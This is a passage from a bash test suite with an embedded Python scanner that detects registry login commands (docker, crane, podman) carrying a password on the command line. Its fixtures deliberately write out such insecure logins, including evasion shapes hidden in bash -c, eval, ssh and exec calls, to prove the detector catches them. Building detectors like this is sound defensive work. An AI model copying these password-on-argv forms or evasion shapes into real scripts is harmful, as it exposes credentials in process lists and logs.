    body-content)       jq -n --arg i "$BODY_ID" '{identifier:$i,password:"someone-else"}' > "$d/shim/calls/1.body" ;;
  esac
  CTL_ROW="$d"
}
for v in good no-calls pw-in-argv pw-in-jq-argv body-not-recorded body-content; do
  evb_mk "$v"; evaluate_body "$CTL_ROW"
  case "$v" in good) want="" ;; body-not-recorded) want="body-not-recorded body-content" ;; *) want="$v" ;; esac
  ctl_want "evaluate_body/$v" "$EV_FAILED" "$want"
done
ctl_row "evaluate_body: a compliant row is green, and each of its clauses (at least one call, password in no curl argv, password in no jq argv, a recorded body, the exact identifier and password in it) fails when only its fact is doctored (an unrecorded body also fails the content clause, which it cannot satisfy)"

# =====================================================================================
# STAGE S8 (argv-bearer sweep, Guard 3, #9757): no registry LOGIN command carries a password on argv.
#
# PROPERTY. No tracked, non-test, non-comment registry login invocation (`crane auth login`, `docker login`, `podman login`, and the variable
# spellings of those binaries: `$CRANE auth login`, `"$DOCKER_BIN" login`) passes a password as an argument: no option token is `-p`, `--password`,
# `--password=<v>`, a glued `-p<value>` or a short cluster holding p (`-up`), in any order relative to the host. `--password-stdin` never matches.
#
# WHY A VARIABLE-AWARE VERB. The restore engine spells its login `$CRANE auth login` (a variable, for the test seam). A scan keyed on the literal
# `crane` sees ZERO engine sites and stays green over the file this stage exists for; the floor row and mutation 8 exist for that.
#
# DERIVATION. One python3 pass (scan.py) over `git ls-files --cached --others --exclude-standard` of a root, minus `*.test.*`, any path with a
# `test`, `tests` or `fixtures` directory, and `knowledge-base/` (the exclusion is by path component at ANY depth: a production script under a directory
# named `test` is invisible); `.md` joins only under `plugins/` (stage S7 treats agent-run markdown as a
# surface). Backslash-continuation lines are joined (a comment line is never continued). Each logical line is TOKENISED with a quote-,
# `$(...)`-, backtick- and `${{ ... }}`-aware splitter: operators (`&&`, `||`, `;`, `|`, `&`, redirections, `)`) end an invocation, a `#` at a word
# start ends the line, and a quoted string is one token, so a prose `docker login` inside an echo, a grep pattern or an alias is not a command. A
# login found INSIDE a `$(...)` or backtick span, or inside a quoted payload that a shell runs (`bash -c`/`-lc`, `eval`, a YAML `run:`/`command:`
# value, `ssh host "..."`, an `exec`-style call), is scanned recursively; any other quoted string is prose. An invocation is a verb, optional
# global flags, an optional `auth`, `login`, then its arguments: it is BAD when any argument is a password option (whatever the host count), and it
# is a SITE (counted against the floor) when it has exactly one host and at least one option. The scan is a FUNCTION OF A ROOT, so the mutation
# rows run the same text on a scratch repository.
#
# NAMED BLIND SPOTS (stated, not hidden): clients that are not crane/docker/podman or a variable named for them (skopeo, oras, regctl, buildah,
# nerdctl, cosign, `helm registry login`; no site exists today), a variable verb with none of those names (`$ENGINE`, `$CTR`), arguments held in a
# variable or array (`"${LOGIN_ARGS[@]}"`), a flag-variable (`$SINK_TLS_FLAG`, anything ending FLAG, FLAGS, OPTS or OPTIONS) that itself carries
# `-p`, a command built by concatenation or an `eval`ed string, a payload inside any other quoted string (e.g. a YAML list item), a YAML folded `>` block, a backslash followed by
# a space or CRLF, a FEEDER that itself carries the token on argv (`/usr/bin/printf '%s' "$T" |`), and the excluded trees. S8 selects on the FULL run only: the affected-test array does not name its population, and editing
# it would arm every PR-gated battery (CTO ruling D1).
#
# FLOOR. The scan sees 12 sites in 7 files on the real tree (measured when this stage was written): 10 already `--password-stdin` (one is a plugin
# doc snippet) and the engine's 2 `$CRANE` lines. A scan that sees fewer (a renamed binary, moved roots, a broken regex) is RED, never a clean bill.
# Retiring a legitimate login site is a floor edit in the same change. No allowlist: there is no residual.
# =====================================================================================
S8_SITE_FLOOR=12; S8_FILE_FLOOR=7
S8="$TMPD/s8"; assert_fixture_dir "$S8"; mkdir -p "$S8/base" "$S8/mut"
cat > "$S8/scan.py" <<'S8PY'
import os, re, subprocess, sys
root = sys.argv[1]
VERB = re.compile(
    r'^(?:.*/)?(?:crane|docker|podman)(?:_[a-z_]*)?$'
    r'|^\$\{?[A-Za-z_]*(?:crane|docker|podman)[A-Za-z_]*(?:\[[@*]\])?\}?$'
    r'|^\$\{[A-Za-z_]+:[-=]?(?:crane|docker|podman)\}$'
    r'|^\$\(command -v (?:crane|docker|podman)\)$', re.I)
VALUED = {"-u", "--username", "-p", "--password", "--config", "--authfile", "--cert-dir", "--registry-config", "-e", "--email"}
# A bare flag-variable (`$SINK_TLS_FLAG`) expands to an option or to nothing: neither the host nor a visible option.
NEUTRAL = re.compile(r'^"?\$\{?[A-Za-z_]*(?:FLAG|FLAGS|OPTS|OPTIONS)\}?"?$', re.I)
PLACEHOLDER = re.compile(r"<[A-Za-z][\w.\- ]*>")
CLUSTER_C = re.compile(r"^-[A-Za-z]*c$")
PAYLOAD_KEYS = ("run:", "command:", "script:", "cmd:", "entrypoint:")
EXEC_CALLS = re.compile(r"^(?:exec|execSync|execFile|system|popen|run|call|check_output|check_call|Popen|Command)$")
REDIRS = {"\0>", "\0>>", "\0<", "\0<<", "\0<<<", "\0&>", "\0>&"}
OPS = ("&&", "||", "<<<", "<<", ">>", "&>", ">&", ";", "|", ">", "<", "&", ")", "(")


def tokens(s):
    """Quote-, $(..)-, ${{..}}- and backtick-aware split. Operators come back as \\0-prefixed tokens; a `#` at a word start ends the line."""
    out, cur, i, n, q, angle = [], [], 0, len(s), None, False

    def flush():
        if cur:
            out.append("".join(cur))
            cur.clear()

    while i < n:
        c = s[i]
        if q:
            cur.append(c)
            if c == "\\" and q == '"' and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == q:
                q = None
            i += 1
            continue
        if s.startswith("${{", i):
            j = s.find("}}", i)
            j = n if j < 0 else j + 2
            cur.append(s[i:j])
            i = j
            continue
        if s.startswith("$(", i):
            d, j = 1, i + 2
            while j < n and d:
                d += (s[j] == "(") - (s[j] == ")")
                j += 1
            cur.append(s[i:j])
            i = j
            continue
        if c == "`":
            j = s.find("`", i + 1)
            j = n if j < 0 else j + 1
            cur.append(s[i:j])
            i = j
            continue
        if c in "\"'":
            q = c
            cur.append(c)
            i += 1
            continue
        if c.isspace():
            flush()
            i += 1
            continue
        if c == "#" and not cur:
            break
        if c == "<" and not cur and PLACEHOLDER.match(s, i):
            angle = True  # a `<placeholder>` in a doc, not a redirection
        if angle:
            cur.append(c)
            if c == ">":
                angle = False
            i += 1
            continue
        fd = cur and "".join(cur).isdigit() and s[i:i + 1] in "<>"
        op = next((o for o in OPS if s.startswith(o, i)), None)
        if op:
            if fd:
                cur.clear()
            flush()
            out.append("\0" + op)
            i += len(op)
            continue
        cur.append(c)
        i += 1
    flush()
    return out


def unq(t):
    return t[1:-1] if len(t) > 1 and t[0] in "\"'" and t[-1] == t[0] else t


SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "su"}


def subs(t, md=False):
    """The bodies of every balanced $( ... ) span inside one token, and its backtick spans (never in markdown inline code or single quotes)."""
    out, i = ([] if md or t[:1] == "'" else [x[1:-1] for x in re.findall(r"`[^`]*`", t)]), 0
    while True:
        i = t.find("$(", i)
        if i < 0:
            return out
        d, j = 1, i + 2
        while j < len(t) and d:
            d += (t[j] == "(") - (t[j] == ")")
            j += 1
        out.append(t[i + 2:j - 1])
        i = j


def payload_context(toks, i):
    """Is toks[i] (a quoted string) code that a shell will run, rather than prose?"""
    prev = toks[i - 1] if i else ""
    if prev == "--" and i > 1:
        prev = toks[i - 2]
    start = i
    while start and toks[start - 1][:1] != "\0":
        start -= 1  # the first token of the command this string belongs to
    words = [unq(x) for x in toks[start:i]]
    if CLUSTER_C.match(prev) and any(w in SHELLS for w in words):
        return True
    if prev == "eval" or prev in PAYLOAD_KEYS or ("ssh" in words and not prev.startswith("-")):
        return True
    return prev == "\0(" and i > 1 and bool(EXEC_CALLS.match(toks[i - 2].split(".")[-1]))


def scan_line(code, depth=0, md=False):
    toks, recs, i = tokens(code), [], 0
    while i < len(toks):
        t = toks[i]
        if depth < 3 and t[:1] != "\0" and ("$(" in t or "`" in t):
            for inner in subs(t, md):
                recs += scan_line(inner, depth + 1, md)  # a login inside a command substitution
        if depth < 2 and t[:1] in "\"'" and payload_context(toks, i):
            recs += scan_line(unq(t), depth + 1, md)  # bash -lc "docker login ..." / eval "..." / run: '...' / ssh host "..." / execSync("...")
        if t[:1] == "\0" or not VERB.match(unq(t)):
            i += 1
            continue
        k, found = i + 1, False
        lead = 2 if "_" in unq(t) and t[:1] != "$" else 0  # a wrapper (crane_capture <out> <err> auth login ...) takes two bare words first
        while k < len(toks) and k < i + 8 and toks[k][:1] != "\0":
            u = unq(toks[k])
            if u == "login":
                found = True
                break
            if u == "auth":
                k += 1
                continue
            if not u.startswith("-"):
                if lead:
                    lead -= 1
                    k += 1
                    continue
                break
            k += 1
            if k < len(toks) and toks[k][:1] != "\0" and unq(toks[k]) not in ("auth", "login") and not unq(toks[k]).startswith("-"):
                k += 1
        if not found:
            i += 1
            continue
        j, opts, hosts, bad = k + 1, [], 0, False
        while j < len(toks):
            if toks[j][:1] == "\0":
                if toks[j] in REDIRS:  # a redirection may sit anywhere in the argument list: skip it and its target (never an option)
                    j += 2 if j + 1 < len(toks) and not unq(toks[j + 1]).startswith("-") else 1
                    continue
                break
            u = unq(toks[j])
            if u.startswith("-"):
                opts.append(u)
                glued_user = u.startswith("-u") and not u.startswith("--") and len(u) > 3  # -ujpierre is a username; -up is treated as a cluster (conservative)
                if u in ("-p", "--password") or u.startswith("--password=") or (re.match(r"^-[A-Za-z]*p", u) and not u.startswith("--") and not glued_user):
                    bad = True
                if u in VALUED or (u == "--tls-verify" and j + 1 < len(toks) and unq(toks[j + 1]) in ("true", "false")):
                    j += 1
            elif NEUTRAL.match(toks[j]):
                pass
            else:
                hosts += 1
            j += 1
        if bad or (hosts == 1 and opts):
            recs.append((" ".join(opts), "1" if bad else "0"))
        i = j
    return recs


out = subprocess.run(["git", "-C", root, "ls-files", "-z", "--cached", "--others", "--exclude-standard"], capture_output=True, check=True)
for rel in out.stdout.decode("utf-8", "replace").split("\0"):
    parts = rel.split("/")
    if not rel or rel.endswith(".test.sh") or ".test." in parts[-1] or "test" in parts[:-1] or "tests" in parts[:-1] or "fixtures" in parts[:-1] or parts[0] == "knowledge-base":
        continue
    if rel.endswith(".md") and parts[0] != "plugins":
        continue
    try:
        data = open(os.path.join(root, rel), "rb").read()
    except OSError:
        continue
    if b"\0" in data[:8192] or b"login" not in data.lower():
        continue
    lines = data.decode("utf-8", "replace").split("\n")
    i = 0
    while i < len(lines):
        start, cur = i + 1, lines[i]
        while cur.endswith("\\") and not cur.lstrip().startswith("#") and i + 1 < len(lines):
            i += 1
            cur = cur[:-1] + " " + lines[i].strip()
        i += 1
        if "login" not in cur.lower():
            continue
        for opts, bad in scan_line(cur.strip(), 0, rel.endswith(".md")):
            print("\t".join([rel, str(start), opts, bad, cur.strip()]))
S8PY
s8_scan() { python3 -I "$S8/scan.py" "$1"; } # <root>: one TSV record per invocation: file, line, options, bad(0|1), code
S8_J_REASONS=""; S8_J_SITES=0; S8_J_FILES=0; S8_J_DETAIL=""
s8_judge_text() { # <scan text>: sets S8_J_REASONS (empty = GREEN), S8_J_SITES, S8_J_FILES, S8_J_DETAIL. Reasons: floor, bad:<file>
  local f
  S8_J_REASONS=""
  S8_J_SITES="$(grep -c . <<<"$1" || true)"
  S8_J_FILES="$(cut -f1 <<<"$1" | sort -u | grep -c . || true)"
  S8_J_DETAIL="$(awk -F'\t' '$4 == 1 { print $1 ":" $2 }' <<<"$1" | tr '\n' ' ')"
  [[ "$S8_J_SITES" -ge "$S8_SITE_FLOOR" && "$S8_J_FILES" -ge "$S8_FILE_FLOOR" ]] || S8_J_REASONS+=" floor"
  while IFS= read -r f; do [[ -n "$f" ]] && S8_J_REASONS+=" bad:$f"; done < <(awk -F'\t' '$4 == 1 { print $1 }' <<<"$1" | sort -u)
  S8_J_REASONS="${S8_J_REASONS# }"
}
s8_judge() { s8_judge_text "$(s8_scan "$1")"; } # <root>
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S8/base" || exit 1; git -C "$S8/base" init -q ) \
  || fatal "S8 could not create the scratch repository"
S8_REAL_SCAN="$(s8_scan "$REPO_ROOT")"
S8_ENGINE="scripts/registry-restore-from-ghcr.sh"
S8_CONT="apps/web-platform/infra/cloud-init-inngest.yml"
# The base copies EVERY file the floor counts (a partial base would trip the floor and turn every mutant RED for the wrong reason).
while IFS= read -r f; do [[ -n "$f" ]] || continue; mkdir -p "$S8/base/$(dirname "$f")"; cp "$REPO_ROOT/$f" "$S8/base/$f"; done < <(cut -f1 <<<"$S8_REAL_SCAN" | sort -u)
s8_fresh() { local d="$S8/mut/$1"; assert_fixture_dir "$d"; rm -rf "${d:?}"; cp -a "$S8/base" "$d" && printf '%s' "$d"; } # <name>: prints a new root
s8_put() { assert_fixture_dir "$1"; mkdir -p "$1/$(dirname "$2")"; printf '%s\n' "$3" > "$1/$2"; } # <root> <relative path> <content>
s8_edit() { s6_edit "$@" || fatal "S8 mutation did not land: $2"; } # <file> <old> <new> [<count>]: replace exactly <count> occurrences or abort the suite
s8_has() { [[ " $S8_J_REASONS " == *" $1 "* ]]; } # <reason>: the last judgement carried that reason
s8_recs() { s8_scan "$1" | awk -F'\t' -v f="$2" -v b="$3" '$1 == f && ($4 == b || b == "") { n++ } END { print n + 0 }'; } # <root> <file> <bad: 0|1|empty>: record count

s8_judge_text "$S8_REAL_SCAN"
S8_REAL_REASONS="$S8_J_REASONS"; S8_REAL_SITES="$S8_J_SITES"; S8_REAL_FILES="$S8_J_FILES"
if [[ -z "$S8_REAL_REASONS" ]]; then row "S8 Guard 3: no tracked registry login (crane, docker, podman, in literal or variable spelling) carries a password on argv ($S8_REAL_SITES invocations in $S8_REAL_FILES files, derived over the whole tracked tree)" ok
else row "S8 Guard 3: a registry login invocation carries a password on argv, or the scan saw fewer sites than its floor" fail "reasons='$S8_REAL_REASONS' at=$S8_J_DETAIL sites=$S8_REAL_SITES files=$S8_REAL_FILES"; fi
if [[ "$S8_REAL_SITES" -ge "$S8_SITE_FLOOR" && "$S8_REAL_FILES" -ge "$S8_FILE_FLOOR" ]]; then row "S8 floor: the scan saw $S8_REAL_SITES invocations in $S8_REAL_FILES files (the floor is $S8_SITE_FLOOR sites in $S8_FILE_FLOOR files: the stdin-form sites plus the engine's 2 \$CRANE lines)" ok
else row "S8 floor: the scan saw fewer than $S8_SITE_FLOOR sites in $S8_FILE_FLOOR files (a renamed binary, moved roots or a broken scanner)" fail "sites=$S8_REAL_SITES files=$S8_REAL_FILES"; fi
S8_ENG_N="$(awk -F'\t' -v f="$S8_ENGINE" '$1 == f { n++ } END { print n + 0 }' <<<"$S8_REAL_SCAN")"
S8_ENG_BAD="$(awk -F'\t' -v f="$S8_ENGINE" '$1 == f && ($4 == 1 || $3 !~ /--password-stdin/) { n++ } END { print n + 0 }' <<<"$S8_REAL_SCAN")"
if [[ "$S8_ENG_N" -eq 2 && "$S8_ENG_BAD" -eq 0 ]]; then row "S8 engine: scripts/registry-restore-from-ghcr.sh holds exactly 2 login invocations (the sink and GHCR, spelled \$CRANE) and both carry --password-stdin and no password flag" ok
else row "S8 engine: the restore engine's two \$CRANE login lines were not both seen in the --password-stdin form" fail "engine-sites=$S8_ENG_N not-stdin-or-bad=$S8_ENG_BAD"; fi

# --- the baseline-GREEN control: the scratch base is judged by the SAME function and must be green ---------------------------------
s8_judge "$S8/base"
if [[ -z "$S8_J_REASONS" && "$S8_J_SITES" -eq "$S8_REAL_SITES" && "$S8_J_FILES" -eq "$S8_REAL_FILES" ]]; then row "S8 control: the scratch base (a copy of every file the floor counts) is judged GREEN with the real tree's site and file counts, so every mutant below is RED for its mutation alone" ok
else row "S8 control: the scratch base is not GREEN with the real counts (every mutant below would be measuring the base)" fail "reasons='$S8_J_REASONS' sites=$S8_J_SITES/$S8_REAL_SITES files=$S8_J_FILES/$S8_REAL_FILES"; fi

# --- mutation 1: either engine login reverted to the password on argv -------------------------------------------------------------
d="$(s8_fresh m1a)"; s8_edit "$d/$S8_ENGINE" '--password-stdin $SINK_TLS_FLAG' '-p "$ZOT_PUSH_TOKEN" $SINK_TLS_FLAG'; s8_judge "$d"; m1a="$S8_J_REASONS"
d="$(s8_fresh m1b)"; s8_edit "$d/$S8_ENGINE" '-u "$GHCR_USER" --password-stdin' '-u "$GHCR_USER" -p "$GHCR_TOKEN"'; s8_judge "$d"; m1b="$S8_J_REASONS"
if [[ "$m1a" == "bad:$S8_ENGINE" && "$m1b" == "bad:$S8_ENGINE" ]]; then row "S8 mutation 1: reverting either engine login (sink, GHCR) to -p \"\$X\" is RED, reason bad:$S8_ENGINE and nothing else" ok
else row "S8 mutation 1: an engine login reverted to -p argv was not judged exactly bad:$S8_ENGINE" fail "sink='$m1a' ghcr='$m1b'"; fi

# --- mutation 2: every spelling of the password option, in the engine's own line and in option orders a regex would miss -------------
m2=""; n2=0
for v in '--password "$ZOT_PUSH_TOKEN"' '--password=$ZOT_PUSH_TOKEN' '-p"$ZOT_PUSH_TOKEN"' '-pXYZ' '-up "$ZOT_PUSH_TOKEN"'; do
  n2=$((n2 + 1)); d="$(s8_fresh m2-$n2)"; s8_edit "$d/$S8_ENGINE" '--password-stdin $SINK_TLS_FLAG' "$v \$SINK_TLS_FLAG"; s8_judge "$d"; [[ "$S8_J_REASONS" == "bad:$S8_ENGINE" ]] || m2+=" [$v => $S8_J_REASONS]"
done
for v in 'docker login -p "$X" -u u registry.example.test:5000' 'docker --config "$D" login -u u -p "$X" registry.example.test:5000' 'crane --insecure auth login -u u -p "$X" registry.example.test:5000'; do
  n2=$((n2 + 1)); d="$(s8_fresh m2-$n2)"; s8_put "$d" scripts/extra-a.sh "$v"; s8_judge "$d"; [[ "$S8_J_REASONS" == "bad:scripts/extra-a.sh" ]] || m2+=" [$v => $S8_J_REASONS]"
done
if [[ -z "$m2" ]]; then row "S8 mutation 2: the long forms, the glued forms, a short cluster (-up), -p before the host and global flags before the subcommand are each RED, reason bad:<that file>" ok
else row "S8 mutation 2: a password-option spelling or an option order was not judged bad" fail "$m2"; fi

# --- mutations 4, 5: a -p on a continuation line, and --password-stdin TOGETHER with -p ------------------------------------------
d="$(s8_fresh m4)"; s8_edit "$d/$S8_CONT" '--password-stdin >/dev/null 2>&1 || verify_fail pull-login' '-p "$ZOT_PULL_TOKEN" >/dev/null 2>&1 || verify_fail pull-login'; s8_judge "$d"
if [[ "$S8_J_REASONS" == "bad:$S8_CONT" ]]; then row "S8 mutation 4: a -p on the CONTINUATION line of a backslash-split \"\$DOCKER_BIN\" login is RED, reason bad:$S8_CONT (the per-file join sees it)" ok
else row "S8 mutation 4: a -p on a continuation line was not judged bad" fail "reasons='$S8_J_REASONS'"; fi
d="$(s8_fresh m5)"; s8_edit "$d/$S8_ENGINE" '--password-stdin $SINK_TLS_FLAG' '--password-stdin -p "$ZOT_PUSH_TOKEN" $SINK_TLS_FLAG'; s8_judge "$d"
if [[ "$S8_J_REASONS" == "bad:$S8_ENGINE" ]]; then row "S8 mutation 5: --password-stdin TOGETHER with -p (the precondition met, the property broken) is RED, reason bad:$S8_ENGINE" ok
else row "S8 mutation 5: --password-stdin alongside -p was not judged bad" fail "reasons='$S8_J_REASONS'"; fi

# --- mutation 7: a SECOND member after a compliant first, on the next line and on the SAME line ----------------------------------
d="$(s8_fresh m7)"
s8_put "$d" scripts/extra-b.sh "$(printf '%s\n%s' "printf '%s' \"\$T\" | docker login h.example.test:5000 -u u --password-stdin" 'docker login h.example.test:5000 -u u -p "$T"')"
s8_judge "$d"
if [[ "$S8_J_REASONS" == "bad:scripts/extra-b.sh" && "$S8_J_SITES" -eq $((S8_REAL_SITES + 2)) ]]; then row "S8 mutation 7: a compliant login followed by a -p login in the same new file is RED for that file, and both are counted (the second member is not shadowed by the first)" ok
else row "S8 mutation 7: the second member of a new file was not judged bad, or the compliant first was not counted" fail "reasons='$S8_J_REASONS' sites=$S8_J_SITES want=$((S8_REAL_SITES + 2))"; fi
m7b=""; n7=0
for v in 'printf %s "$A" | docker login h1.example -u u --password-stdin && docker login h2.example -u u -p "$B"' 'docker login h1.example -u u --password-stdin; docker login h2.example -u u -p "$B"' 'echo "step #1"; docker login h.example -u u -p "$B"'; do
  n7=$((n7 + 1)); d="$(s8_fresh m7b-$n7)"; s8_put "$d" scripts/extra-d.sh "$v"; s8_judge "$d"
  [[ "$S8_J_REASONS" == "bad:scripts/extra-d.sh" && "$(s8_recs "$d" scripts/extra-d.sh "")" -ge 1 && "$(s8_recs "$d" scripts/extra-d.sh 1)" -eq 1 ]] || m7b+=" [$v => $S8_J_REASONS]"
  case "$n7" in 1|2) [[ "$(s8_recs "$d" scripts/extra-d.sh "")" -eq 2 ]] || m7b+=" [$v => the compliant first login was not split off and counted]" ;; esac
done
if [[ -z "$m7b" ]]; then row "S8 mutation 7b: a -p login AFTER a compliant one on the same line (&&, ;) and after a quoted '#' earlier on the line is RED" ok
else row "S8 mutation 7b: a same-line second invocation hid a -p login" fail "$m7b"; fi

# --- evasion shapes the review found: each is a password on argv that a looser scanner reads as clean or as nothing -----------------
m_ev=""; n_ev=0
for v in 'docker login ghcr.io -u $(id -un) -p "$X"' 'crane auth login ghcr.io -u $(< f) -p "$X"' 'docker login ghcr.io -u u -p "$(cat /run/secrets/x)"' 'docker login -u u -p "$X"' 'docker login -u u --password "$X"' \
         'docker login ghcr.io -u ${{ github.actor }} -p "$X"' 'docker login -u "a;b" -p "$X" host' 'docker login host >/tmp/o -p "$X"' 'docker login host &>/dev/null -p "$X"' 'docker login host 2>&1 -p "$X"' \
         'podman login --authfile /x -p "$X" host' 'bash -c "docker login -u u -p $X host"' 'bash -lc "docker login -u u -p $X host"' 'eval "docker login -u u -p $X host"' \
         'ssh h "docker login -u u -p $X host"' 'ssh -o BatchMode=yes root@h "docker login -u u -p $X host"' 'os.system("docker login -u u -p x host")' 'docker login <your registry> -p "$X" host' "run: 'docker login -u u -p \"\$X\" host'" 'OUT=`docker login -u u -p "$X" host`' 'execSync(`docker login -u u -p ${t} host`)' \
         '/usr/bin/docker login -u u -p "$X" host' 'crane_capture o e auth login host -u u -p "$X"' 'X="$(printf %s "$T" | docker login host -u u -p "$T")"'; do
  n_ev=$((n_ev + 1)); d="$(s8_fresh ev-$n_ev)"; s8_put "$d" scripts/extra-e.sh "$v"; s8_judge "$d"; [[ "$S8_J_REASONS" == "bad:scripts/extra-e.sh" ]] || m_ev+=" [$v => $S8_J_REASONS]"
done
if [[ -z "$m_ev" ]]; then row "S8 evasion shapes: each construct sits BEFORE the -p so a mis-tokenised tail loses it: a \$( ) user, a command-substitution password, a host-less login, a \${{ }} expression, a quoted ;, a redirection (>, &>, 2>&1) before -p, a valued option, bash -c and -lc, eval, ssh, a YAML run: value, a backtick span, an exec call, a path verb, a wrapper and a login inside \$( ) are each RED" ok
else row "S8 evasion shapes: a password on argv was judged clean or unseen" fail "$m_ev"; fi

# --- mutation 8: dispatch and floor (scan roots broken, the verb renamed, one site file removed) ------------------------------------
m8=""
d="$(s8_fresh m8a)"; rm -rf "${d:?}/apps" "${d:?}/scripts" "${d:?}/.github" "${d:?}/plugins"; s8_judge "$d"; s8_has floor && [[ "$S8_J_SITES" -eq 0 ]] || m8+=" [roots broken => '$S8_J_REASONS' sites=$S8_J_SITES]"
d="$(s8_fresh m8b)"; s8_edit "$d/$S8_ENGINE" '$CRANE auth login' '$KRANE auth login' 2; s8_judge "$d"; s8_has floor && [[ "$S8_J_SITES" -eq $((S8_REAL_SITES - 2)) ]] || m8+=" [verb renamed => '$S8_J_REASONS' sites=$S8_J_SITES]"
d="$(s8_fresh m8c)"; rm -f "${d:?}/${S8_CONT:?}"; s8_judge "$d"; s8_has floor || m8+=" [site file removed => '$S8_J_REASONS']"
if [[ -z "$m8" ]]; then row "S8 mutation 8: scan roots broken (0 sites), the engine's verb renamed past the verb match (the sites vanish), and one site file removed are each RED, reason floor" ok
else row "S8 mutation 8: a dispatch or floor mutation was not judged floor" fail "$m8"; fi

# --- must-pass inputs that are NOT invocations (prose, patterns, aliases, comments): zero BAD records -----------------------------
d="$(s8_fresh pass1)"
s8_put "$d" scripts/prose.sh "$(cat <<'S8PASS'
description: 'Bring up a cloudflared TCP bridge to the private-net zot registry so a GH runner can reach it, and (unless skipped) docker login to it'
          echo "::error::docker login to zot (127.0.0.1:5000) failed over the CF-tunnel bridge. Read the cloudflared log below."
    logger -t "$LOG_TAG" "ZOT_GATE: active — docker login $ZOT_REGISTRY_URL ok (zot-primary)"
    logger -t "$LOG_TAG" "ZOT_GATE: docker login $ZOT_REGISTRY_URL FAILED class=$zclass http=${zhttp:-none} — no pull path (zot login failed)"
  if grep -qE '(ZOT_GATE|PRELUDE): docker login .* FAILED' <<<"$line" \
     && true; then :; fi
for tok in 'docker push' 'cosign' 'crane' 'id-token' 'docker login' 'login-action'; do :; done
# token free of chars that break `docker login -p` / htpasswd.
echo "Use docker login registry -u me -p secret"
printf 'docker login -u u -p pw r.io\n'
grep -q "docker login -p" file
alias dl='docker login r.io -u u -p t'
echo 'Run `docker login -p x` to see'
grep -qc "docker login -p" file
# docker login r.io -u u -p t
docker login --help
docker logout r.io
S8PASS
)"
s8_put "$d" plugins/prose.md 'Never write `docker login -u u -p "$T"`; use `--password-stdin`'
if [[ "$(s8_recs "$d" scripts/prose.sh 1)" -eq 0 && "$(s8_recs "$d" plugins/prose.md 1)" -eq 0 ]]; then row "S8 must-pass: prose and pattern lines that merely MENTION docker login (the action description, an ::error:: echo, the ci-deploy logger lines, a grep pattern, a token-list loop, an echo, a printf, an alias, a single-quoted backtick, grep -qc, a markdown inline-code warning, a comment, --help, logout) are not invocations, so none is judged bad" ok
else row "S8 must-pass: a prose or pattern mention of docker login was judged a password-on-argv login" fail "$(s8_scan "$d" | awk -F'\t' '$1 == "scripts/prose.sh" && $4 == 1 { print $2 }' | tr '\n' ' ')"; fi
m_ok=""; n_ok=0
for v in 'printf %s "$T" | docker login --insecure -u u h.example.test:5000 --password-stdin' 'printf %s "$T" | docker login h.example.test:5000 -u u --password-stdin && mkdir -p x' \
         'printf %s "$T" | docker login --password-stdin -u u h.example.test:5000' 'printf %s "$T" | docker login h.example.test:5000 -u ${{ github.actor }} --password-stdin' \
         'printf %s "$T" | docker login h.example.test:5000 -u u --password-stdin &>/dev/null' 'printf %s "$T" | docker login h.example.test:5000 -u u --password-stdin 2>&1 | tee x' \
         'aws ecr get-login-password | docker login --username AWS --password-stdin r.io' \
         'podman login --authfile /x -u u --password-stdin h.example.test:5000 < tok.txt' 'podman login --tls-verify false -u u --password-stdin h.example.test:5000' \
         'docker login h.example.test:5000 -u u --password-stdin <tok.txt && mkdir -p out' 'docker login h.example.test:5000 -ujpierre --password-stdin'; do
  n_ok=$((n_ok + 1)); d="$(s8_fresh pass2-$n_ok)"; s8_put "$d" scripts/extra-c.sh "$v"
  n="$(s8_recs "$d" scripts/extra-c.sh "")"; b="$(s8_recs "$d" scripts/extra-c.sh 1)"
  [[ "$n" -eq 1 && "$b" -eq 0 ]] || m_ok+=" [$v => sites=$n bad=$b]"
done
if [[ -z "$m_ok" ]]; then row "S8 must-pass: compliant variants (an extra --insecure, a trailing && mkdir -p x, --password-stdin before the host, a \${{ }} user, &>, 2>&1 | tee, an ECR password feeder, a valued --authfile, --tls-verify false, a <file redirect and a glued -ujpierre username) are each counted once and judged GREEN" ok
else row "S8 must-pass: a compliant --password-stdin variant was mis-counted or judged bad" fail "$m_ok"; fi
# --- exclusion rules: a -p login under each excluded path is not judged; under a similarly named non-excluded path it IS -------------
m_x=""; n_x=0
for pair in 'x/test/a.sh:0' 'x/tests/a.sh:0' 'x/fixtures/a.sh:0' 'a.test.ts:0' 'knowledge-base/a.sh:0' 'docs/a.md:0' 'plugins/a.md:1' 'scripts/testing/a.sh:1' 'apps/web-platform/a.ts:1'; do
  n_x=$((n_x + 1)); d="$(s8_fresh excl-$n_x)"; s8_put "$d" "${pair%%:*}" 'docker login -u u -p "$X" host'
  [[ "$(s8_recs "$d" "${pair%%:*}" 1)" -eq "${pair##*:}" ]] || m_x+=" [${pair%%:*} => want ${pair##*:} bad]"
done
if [[ -z "$m_x" ]]; then row "S8 exclusions: a -p login under test/, tests/, fixtures/, *.test.*, knowledge-base/ or a .md outside plugins/ is not scanned, and the same login under plugins/*.md, scripts/testing/ and apps/ is" ok
else row "S8 exclusions: an exclusion rule hid a login it should not, or missed one it should" fail "$m_x"; fi
echo "=== stage S8: Guard 3 rows (registry login password off argv: tokenised derived census, floor, mutations, evasion shapes, must-pass inputs) done ==="

# =====================================================================================
# STAGE S9 (#9757 item 2): a credential never rides terraform's argv as a `-var` option. Guard 1 is a derived static scan plus two pins (rehearsal
# workflow option names, and the export position in every terraform plan/destroy step); Guard 2 EXECUTES the two `terraform destroy` step bodies (the
# arms whose failure leaks a paid host) under stubs and checks the token reaches terraform by environment and reaches no argv.
#
# GUARD 1 SCAN. Corpus = tracked + untracked non-ignored files minus S8's exclusion predicate (`*.test.sh`, `.test.` basenames, any `test`/`tests`/
# `fixtures` directory component, `knowledge-base/`); extensions .yml .yaml .sh .bash, plus .md under plugins/ only. Backslash continuations are joined
# (a comment line is never continued); full-line comments are skipped outside markdown. The option regex needs a LEFT boundary and the `NAME=` shape,
# so `--name-transformer tf-var -- \` and `-var-file` cannot match; it accepts `-var NAME=v`, `-var=NAME=v`, quoted forms, the `--var` spelling and a
# quoted option word. There is NO terraform-verb requirement (unlike S8): `VAR_ARGS+=(-var=...)` array building and `bash -c "... -var ..."` payloads
# carry the same exposure. A literal NAME is judged by a credential-name regex; a non-literal NAME (`-var "$K=$V"`) cannot be judged and is refused.
#
